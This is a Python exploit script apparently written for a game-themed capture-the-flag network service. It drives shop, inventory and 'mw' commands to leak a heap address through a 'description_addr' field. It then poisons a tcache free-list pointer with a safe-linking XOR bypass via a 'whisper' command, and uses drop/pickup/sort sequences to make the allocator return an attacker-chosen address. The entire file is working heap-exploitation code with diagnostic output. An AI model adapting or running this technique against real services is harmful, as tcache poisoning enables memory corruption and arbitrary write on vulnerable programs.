#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); TARGET=int(sys.argv[3],16)
def connect(tries=60):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(4)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
def drain(s,t=0.9):
    time.sleep(t); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
    except Exception: pass
    return o.decode('utf-8','replace')
def show(s):
    s.sendall(b"mw show\n"); time.sleep(0.25); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
            if b"Drops:" in o: break
    except Exception: pass
    return o.decode('utf-8','replace')
s,b=connect()
if s is None: print("NO BANNER"); sys.exit(1)
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=show(s); m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("NO RING"); sys.exit(1)
base=int(m.group(1),16); print("[base] 0x%x"%base,flush=True)
# setup [Ring0, Bomb1]
cmd(s,"inv drop 0",["tx: inventory frees","invalid"],2)   # drop branch, ring->0
time.sleep(0.4)
cmd(s,"shop buy 3 1",["tx:","not enough"],2); time.sleep(0.3)
# step3: drop ring -> base in transaction tcache
cmd(s,"inv drop 0",["tx: inventory frees","invalid"],2); time.sleep(0.4)
# step4: poison
fd=TARGET^(base>>12)
cmd(s,"mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
o=show(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head poison] "+(m.group(1) if m else "?")+" expect "+hex(fd),flush=True)
# step5: pickup ring clone -> [Bomb0, R1]
cmd(s,"mw pickup 0",["tx: item added","invalid"],2); time.sleep(0.3)
# step6: decouple drop bomb(0) + sort
s.sendall(b"inv drop 0\ninv sort\n")
o=drain(s,1.3)
print("[decouple] "+repr(o[-260:]),flush=True)
o=show(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head after decouple] "+(m.group(1) if m else "?")+"  (want: T=0x%x)"%TARGET,flush=True)
# step7+8: pickup decoupled ring clone, then normal drop to pop T
o=drain(s,0.4)
s.sendall(b"mw pickup 0\n"); time.sleep(0.3); drain(s,0.3)
s.sendall(b"inv list\n"); o=drain(s,0.4); print("[inv] "+" || ".join(l.strip() for l in o.splitlines() if "type=" in l)[:240],flush=True)
s.sendall(b"inv drop 0\n"); o=drain(s,1.2)
print("[pop T out] "+repr(o[-200:]),flush=True)
try:
    s.sendall(b"mw show\n"); o=drain(s,0.6); print("[alive] "+repr(o[:90]),flush=True)
except Exception as e: print("[CRASH] "+str(e),flush=True)
s.close()
